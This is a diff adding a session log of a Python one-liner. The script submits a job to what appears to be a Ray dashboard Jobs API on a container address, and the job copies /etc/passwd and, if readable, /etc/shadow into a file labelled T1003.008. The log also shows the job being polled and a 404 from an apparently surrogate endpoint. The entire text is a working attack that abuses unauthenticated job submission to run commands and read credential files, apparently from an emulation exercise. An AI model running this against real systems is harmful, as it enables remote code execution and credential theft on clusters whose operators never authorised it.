@@ -1,0 +1,43 @@
+$ python3 -c 'import json
+import requests
+import sys
+import time
+payload = json.loads('"'"'{"entrypoint": "head -n 5 /etc/passwd > /tmp/T1003.008.out && if test -r /etc/shadow; then head -n 3 /etc/shadow >> /tmp/T1003.008.out; fi"}'"'"')
+base = '"'"'http://172.17.0.3:8265'"'"'
+response = requests.post(base + '"'"'/api/jobs/'"'"', json=payload, timeout=30)
+sys.stdout.write(f'"'"'post_status={response.status_code} body={response.text[:1000]}\n'"'"')
+response.raise_for_status()
+body = response.json()
+submission_id = body.get('"'"'submission_id'"'"') or body.get('"'"'job_id'"'"')
+sys.stdout.write(f'"'"'submission_id={submission_id}\n'"'"')
+terminal = {'"'"'SUCCEEDED'"'"', '"'"'FAILED'"'"', '"'"'STOPPED'"'"'}
+if not submission_id:
+    sys.exit(1)
+for attempt in range(60):
+    status_response = requests.get(base + '"'"'/api/jobs/'"'"' + submission_id, timeout=10)
+    sys.stdout.write(f'"'"'poll={attempt} status={status_response.status_code} body={status_response.text[:1000]}\n'"'"')
+    if status_response.status_code == 404:
+        sys.stdout.write('"'"'poll_unavailable=surrogate_or_legacy_endpoint\n'"'"')
+        sys.exit(0)
+    status_response.raise_for_status()
+    status_body = status_response.json()
+    status = status_body.get('"'"'status'"'"')
+    if status in terminal:
+        sys.exit(0 if status == '"'"'SUCCEEDED'"'"' else 1)
+    time.sleep(1)
+sys.exit(1)'
+exit_code: 0
+--- stdout ---
+post_status=200 body={"returncode":0,"stdout":"","submission_id":"sid_surrogate_0001"}
+
+submission_id=sid_surrogate_0001
+poll=0 status=404 body=<!doctype html>
+<html lang=en>
+<title>404 Not Found</title>
+<h1>Not Found</h1>
+<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
+
+poll_unavailable=surrogate_or_legacy_endpoint
+
+--- stderr ---
+
